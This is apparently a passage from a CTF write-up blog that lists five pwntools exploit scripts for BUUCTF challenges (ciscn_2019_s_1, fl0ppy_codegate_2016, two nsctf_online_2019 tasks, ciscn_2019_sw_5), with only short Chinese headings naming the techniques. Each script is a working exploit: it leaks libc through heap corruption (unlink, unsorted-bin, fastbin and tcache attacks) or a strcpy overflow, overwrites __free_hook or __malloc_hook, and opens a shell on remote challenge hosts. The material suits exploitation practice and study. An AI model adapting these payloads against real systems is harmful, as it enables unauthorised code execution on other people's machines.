<h2 id="0x56-ciscn-2019-s-1"><a href="#0x56-ciscn-2019-s-1" class="headerlink" title="0x56 ciscn_2019_s_1"></a>0x56 ciscn_2019_s_1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_s_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">	sh.sendlineafter("4.show\n",'1')</span><br><span class="line">	sh.sendlineafter("index:",str(idx))</span><br><span class="line">	sh.sendlineafter("size:",str(size))</span><br><span class="line">	sh.recvuntil("gift: ")</span><br><span class="line">	data = int(sh.recvuntil("\n",True),16)</span><br><span class="line">	sh.sendafter("content:",content)</span><br><span class="line">	log.success("idx=" + str(idx) + " | address=" + hex(data))</span><br><span class="line">	return data</span><br><span class="line">def edit(idx,content):</span><br><span class="line">	sh.sendlineafter("4.show\n",'3')</span><br><span class="line">	sh.sendlineafter(":",str(idx))</span><br><span class="line">	sh.sendafter(":",content)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">	sh.sendlineafter("4.show\n",'2')</span><br><span class="line">	sh.sendlineafter(":",str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">	sh.sendlineafter("4.show\n",'4')</span><br><span class="line">	sh.sendlineafter("index:",str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_s_1")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">	chunk_list = 0x6020E0</span><br><span class="line">	chunk_size = 0x602060</span><br><span class="line">	key2 = 0x6022B8</span><br><span class="line">	key1 = 0x6022BC</span><br><span class="line">	payload  = p64(0) + p64(0xF1)</span><br><span class="line">	payload += p64(chunk_list - 0x18) + p64(chunk_list - 0x10)</span><br><span class="line">	payload  = payload.ljust(0xF0,'a')</span><br><span class="line">	payload += p64(0xF0)	</span><br><span class="line">	add(0,0xF8,payload)</span><br><span class="line">	add(1,0xF8,'\n')</span><br><span class="line">	add(2,0xF8,'\n')</span><br><span class="line">	add(3,0xF8,'\n')</span><br><span class="line">	add(4,0xF8,'\n')</span><br><span class="line">	add(5,0xF8,'\n')</span><br><span class="line">	add(6,0xF8,'\n')</span><br><span class="line">	payload  = ''</span><br><span class="line">	payload  = payload.ljust(0xF0,'a')</span><br><span class="line">	payload += p64(0x100 * 5 - 0x10)</span><br><span class="line">	edit(4,payload)</span><br><span class="line">	free(5)</span><br><span class="line">	add(7,0xE8,'\n')</span><br><span class="line">	add(8,0xF8,'\n')</span><br><span class="line">	add(9,0xF8,'\n')</span><br><span class="line">	add(10,0xF8,'\n')</span><br><span class="line">	add(11,0xF8,'\n')</span><br><span class="line">	add(12,0xF8,'\n')</span><br><span class="line">	free(8)</span><br><span class="line">	edit(1,p64(0) + p64(key2 - 0x10))</span><br><span class="line">	add(13,0xF8,'\n')</span><br><span class="line">	edit(0,p64(0) * 3 + p64(chunk_list) + p64(elf.got['__libc_start_main']))</span><br><span class="line">	show(1)</span><br><span class="line">	__libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))	</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc +lib.symbols['system']</span><br><span class="line">	binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">	__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">	edit(0,p64(chunk_list) + p64(__free_hook) + p64(binsh))</span><br><span class="line">	edit(1,p64(system))</span><br><span class="line">	free(2)</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("pwn.buuoj.cn",20152,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x57-fl0ppy-codegate-2016"><a href="#0x57-fl0ppy-codegate-2016" class="headerlink" title="0x57 fl0ppy_codegate_2016"></a>0x57 fl0ppy_codegate_2016</h2><h3 id="经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack-addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system-“-bin-sh-x00”"><a href="#经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack-addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system-“-bin-sh-x00”" class="headerlink" title="经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack_addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system(“/bin/sh\x00”)"></a>经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack_addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system(“/bin/sh\x00”)</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("fl0ppy_codegate_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def choose(idx):</span><br><span class="line">	sh.sendlineafter("5. Exit","1")</span><br><span class="line">	sh.sendlineafter("Which floppy do you want to use? 1 or 2?",str(idx))</span><br><span class="line">def write(content1,content2):</span><br><span class="line">	sh.sendlineafter(">","2")</span><br><span class="line">	sh.sendafter(":",content1)</span><br><span class="line">	sh.sendafter(":",content2)</span><br><span class="line">def read():</span><br><span class="line">	sh.sendlineafter(">","3")</span><br><span class="line">def modify(mode,content):</span><br><span class="line">	sh.sendlineafter(">","4")</span><br><span class="line">	sh.sendlineafter("Which one do you want to modify? 1 Description | 2 Data",str(mode))</span><br><span class="line">	sh.sendlineafter(":",content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./fl0ppy_codegate_2016")</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.27.so")</span><br><span class="line">        choose(2)</span><br><span class="line">        write('a','a' * 0xa)</span><br><span class="line">        modify(1,'a' * 0xa)</span><br><span class="line">        choose(1)</span><br><span class="line">        write("\x11","\x12")</span><br><span class="line">        modify(1,'\x12' * 0x20)</span><br><span class="line">        choose(1)</span><br><span class="line">        read()</span><br><span class="line">        sh.recvuntil("\x12" * 16)</span><br><span class="line">        ebp = u32(sh.recv(4)) + 8</span><br><span class="line">        sh.recvuntil("\x12" * 12)</span><br><span class="line">        libc = u32(sh.recv(4))- 241 - lib.symbols['__libc_start_main']</span><br><span class="line">        system = libc + lib.symbols['system']</span><br><span class="line">        binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">        payload = ''</span><br><span class="line">        payload = p32(system) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">        payload = payload.ljust(20,'a')</span><br><span class="line">        payload += p32(ebp + 4)</span><br><span class="line">        payload = payload.ljust(37,'a')</span><br><span class="line">        modify(1,payload)</span><br><span class="line">        log.success("binsh: " + hex(binsh))</span><br><span class="line">        log.success("system: " + hex(system))</span><br><span class="line">        log.success("libc: " + hex(libc))</span><br><span class="line">        log.success("ebp: " + hex(ebp))</span><br><span class="line">        if(debug == 1):</span><br><span class="line">            log.success("pid: " + str(sh.pid))</span><br><span class="line">        sh.sendline("5")</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node3.buuoj.cn",28869,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x58-nsctf-online-2019-pwn1"><a href="#0x58-nsctf-online-2019-pwn1" class="headerlink" title="0x58 nsctf_online_2019_pwn1"></a>0x58 nsctf_online_2019_pwn1</h2><h3 id="覆盖-malloc-hook为one-gadget"><a href="#覆盖-malloc-hook为one-gadget" class="headerlink" title="覆盖__malloc_hook为one_gadget"></a>覆盖__malloc_hook为one_gadget</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil("5.exit")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Input the size:")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("Input the content:")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil("5.exit")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("Input the index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">	sh.recvuntil("5.exit")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil("Input the index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil("Input size:")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("Input new content:")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil("5.exit")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./pwn2")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">		main_arena_offset = lib.symbols['__malloc_hook'] + 0x10</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">		main_arena_offset = lib.symbols['__malloc_hook'] + 0x10</span><br><span class="line">	payload = p64(0xfbad1880)+p64(0x0)*3+'\x00'</span><br><span class="line">	edit(-16,0x28,payload)</span><br><span class="line">	sh.recvuntil(24*'\x00')</span><br><span class="line">	libc = u64(sh.recv(8)) - lib.symbols['_IO_file_jumps']</span><br><span class="line">	log.success("libc_base -> "+hex(libc))</span><br><span class="line">	main_arena = libc + main_arena_offset</span><br><span class="line">	one_gadget = libc + 0xf1147</span><br><span class="line">	log.success("main_arena: " + hex(main_arena))</span><br><span class="line">	add(0xF8,"\x11" * 0xE8)</span><br><span class="line">	add(0x68,"\x22" * 0x58)</span><br><span class="line">	add(0x18,"\x33" * 0x8)</span><br><span class="line">	add(0xF8,"\x44" * 0xE8)</span><br><span class="line">	add(0x18,"\x55" * 0x10)</span><br><span class="line">	free(0)</span><br><span class="line">	edit(2,0x18,'\x00' * 0x10 + p64(0x190))</span><br><span class="line">	free(3)</span><br><span class="line">	payload  = "a"*0xF0 + p64(0) + p64(0x71)</span><br><span class="line">	payload += '\x66' * (0x68 - 0x8)</span><br><span class="line">	payload += p64(0) + p64(0x21)</span><br><span class="line">	payload += '\x77' * 0x18</span><br><span class="line">	add(0x270,"a"*0x100)</span><br><span class="line">	edit(0,len(payload),payload)</span><br><span class="line">	free(1)</span><br><span class="line">	payload  = "a"*0xF0 + p64(0) + p64(0x71)</span><br><span class="line">	payload += p64(main_arena - 0x1b-8) + p64(main_arena -0x1b-8)</span><br><span class="line">	edit(0,len(payload),payload)</span><br><span class="line">	add(0x60,"aaaaaaaaa")</span><br><span class="line">	add(0x60,"\x00" * 3 + p64(one_gadget))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node2.buuoj.cn.wetolink.com",28275,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x59-nsctf-online-2019-pwn2"><a href="#0x59-nsctf-online-2019-pwn2" class="headerlink" title="0x59 nsctf_online_2019_pwn2"></a>0x59 nsctf_online_2019_pwn2</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size):</span><br><span class="line">	sh.recvuntil("6.exit")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Input the size")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">def free():</span><br><span class="line">	sh.recvuntil("6.exit")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">def show():</span><br><span class="line">	sh.recvuntil("6.exit")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">def edit(content):</span><br><span class="line">	sh.recvuntil("6.exit")</span><br><span class="line">	sh.sendline("5")</span><br><span class="line">	sh.recvuntil("Input the note")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def editName(name):</span><br><span class="line">	sh.recvuntil("6.exit")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil("Please input your name")</span><br><span class="line">	sh.send(name)</span><br><span class="line">def init(name):</span><br><span class="line">	sh.recvuntil("Please input your name")</span><br><span class="line">	sh.send(name)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./pwn1")</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">	init("a"*0x30)</span><br><span class="line">	add(0x80)</span><br><span class="line">	add(0x18)</span><br><span class="line">	editName("a"*0x30 + "\x10")</span><br><span class="line">	free()</span><br><span class="line">	add(0x18)</span><br><span class="line">	editName("a"*0x30 + "\x30")</span><br><span class="line">	show()</span><br><span class="line">	sh.recvuntil("\n")</span><br><span class="line">	main_arena = u64(sh.recvuntil("\n",True).ljust(8,"\x00")) - 88 </span><br><span class="line">	libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	unsorted_bin_attack_addr = libc + 0x3C6768</span><br><span class="line">	fastbin_attack_addr = unsorted_bin_attack_addr + 0x18 - 0x1b + 0x10</span><br><span class="line">	add(0x10)</span><br><span class="line">	free()</span><br><span class="line">	add(0x68)</span><br><span class="line">	free()</span><br><span class="line">	add(0x30)</span><br><span class="line">	free()</span><br><span class="line">	add(0x90)</span><br><span class="line">	add(0x20)</span><br><span class="line">	editName("a" * 0x30 + "\x30")</span><br><span class="line">	free()</span><br><span class="line">	add(0x50)</span><br><span class="line">	editName("a" * 0x30 + "\x90")</span><br><span class="line">	edit('a' * 8 + p64(unsorted_bin_attack_addr))</span><br><span class="line">	add(0x30)</span><br><span class="line">	add(0x68)</span><br><span class="line">	add(0x10)	</span><br><span class="line">	editName("a" * 0x30 + "\xc0")</span><br><span class="line">	free()</span><br><span class="line">	add(0x40)</span><br><span class="line">	editName("a" * 0x30 + "\xc0")</span><br><span class="line">	edit(p64(fastbin_attack_addr))</span><br><span class="line">	add(0x68)</span><br><span class="line">	add(0x68)</span><br><span class="line">	payload = "sh\x00"</span><br><span class="line">	payload = payload.ljust(0x30 - 5 - 8,"\x00")</span><br><span class="line">	edit(payload + p64(system))</span><br><span class="line">	free()</span><br><span class="line">	log.success("fastbin_attack_addr: " + hex(fastbin_attack_addr))</span><br><span class="line">	log.success("unsorted_bin_attack_addr: " + hex(unsorted_bin_attack_addr))</span><br><span class="line">	log.success("main_arena: " + hex(main_arena))</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node2.buuoj.cn.wetolink.com",28672,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x60-ciscn-2019-sw-5"><a href="#0x60-ciscn-2019-sw-5" class="headerlink" title="0x60 ciscn_2019_sw_5"></a>0x60 ciscn_2019_sw_5</h2><h3 id="Ubuntu-18-04"><a href="#Ubuntu-18-04" class="headerlink" title="Ubuntu 18.04"></a>Ubuntu 18.04</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_sw_5")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(title,content):</span><br><span class="line">	sh.recvuntil(">> ")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("title:")</span><br><span class="line">	sh.send(title)</span><br><span class="line">	sh.recvuntil("content:")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(">> ")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_sw_5")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)		</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/libc-2.27.so")</span><br><span class="line">	chunk_offset = 0x202040</span><br><span class="line">	add('\x11' * 8,'\x12' * 0x68)</span><br><span class="line">	add('\x21' * 8,'\x22' * 0x68)</span><br><span class="line">	free(0)</span><br><span class="line">	free(0)</span><br><span class="line">	add('\x80','\n')</span><br><span class="line">	heap_base = u64(sh.recvuntil("\x20\n",True)[-6:].ljust(8,"\x00")) - 0x280</span><br><span class="line">	add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">	add(p64(heap_base + 0x20),p64(heap_base + 0x20) * 5)</span><br><span class="line">	payload  = ('\xf9' * 0x8) * 6</span><br><span class="line">	payload += p64(0x250 - 0x50 + 1) + p64(0) * 4 + p64(heap_base + 0x60)</span><br><span class="line">	add('\xaa' * 0x8,payload)</span><br><span class="line">	payload = p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">	add(p64(0),payload)</span><br><span class="line">	free(6)</span><br><span class="line">	payload = p64(0) * 3 + p64(heap_base + 0x60)</span><br><span class="line">	add('\n',payload)</span><br><span class="line">	libc = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00')) + 0x30 - lib.symbols['__malloc_hook'] - 0xa</span><br><span class="line">	__malloc_hook = libc + lib.symbols['__malloc_hook']</span><br><span class="line">	payload = p64(0) * 3 + p64(__malloc_hook)</span><br><span class="line">	add(p64(0),payload)</span><br><span class="line">	one_gadget = [0x4f2c5,0x4f322,0x10a38c]</span><br><span class="line">	add(p64(libc + one_gadget[1]),'\n')</span><br><span class="line">	sh.recvuntil(">> ")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">	log.success("heap_base: " + hex(heap_base))</span><br><span class="line">	if debug == 1:</span><br><span class="line">		log.success("pid = " + str(sh.pid))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node2.buuoj.cn.wetolink.com",28938,0)</span><br></pre></td></tr></tbody></table></figure></div>

